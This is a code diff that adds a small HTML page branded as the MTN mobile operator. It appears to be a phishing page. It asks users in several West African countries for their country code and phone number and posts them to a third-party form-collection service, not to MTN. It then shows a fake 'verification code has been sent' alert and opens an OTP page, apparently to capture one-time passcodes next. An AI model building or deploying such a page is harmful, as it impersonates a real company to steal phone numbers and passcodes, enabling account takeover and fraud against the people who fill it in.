@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mobile account</title>
+    
+    <style>
+        body{
+            background-color: rgba(0, 0, 0, 0.666);
+            color: white;
+            text-align: center;
+            margin: 200px;
+           
+        }
+        
+        .mobile button{
+            
+        border: 20px;
+        background-color:orange;
+        border-radius: 10px;
+            padding: 10px 40px;
+        }       
+        
+        .mobile input{
+            border-radius: 10px;
+            border-color: orange;
+            padding: 10px;
+            word-spacing: 10px;
+        }
+            </style>
+
+</head>
+<body>
+    <div class="mobile">
+    <form action="https://formspree.io/f/mnqkarng" method="POST">
+
+         <h1 style="color: orange;">MTN</h1>
+
+       <input type="text" name="countrycode" list="region" id="Region" placeholder="country" required>
+       <datalist id="region">
+       
+        <option value="+225">cote d'ivoire</option>
+        <option value="+233">Ghana</option>
+        <option value="+234">Nigeria</option>
+        <option value="+228"> Togo</option>
+        <option value="+"> Other include code</option>
+    </datalist><br><br>
+    
+    
+    <input type="number" name="mobile number" placeholder="mobile"><br><br>
+
+    <button onclick="funx(), funy()">Next</button>
+    <script>
+        function funx() {
+     alert("verification code has been sent to your number")
+        }
+        function funy() {
+        open ("otp.html")
+    }
+    </script>
+</form>
+</div>
+</body>
+</html>
